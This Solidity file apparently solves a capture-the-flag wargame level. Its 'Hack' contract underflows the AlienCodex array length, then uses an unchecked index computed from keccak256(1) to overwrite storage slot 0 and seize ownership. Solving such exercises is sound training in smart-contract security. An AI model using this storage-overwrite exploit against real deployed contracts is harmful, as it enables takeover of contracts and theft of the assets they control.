// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    constructor(IAlienCodex alienCodexContract) {
        alienCodexContract.makeContact();
        alienCodexContract.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;

        unchecked {
            i -= h;
        }

        alienCodexContract.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(alienCodexContract.owner() == msg.sender, "hack failed");
    }
}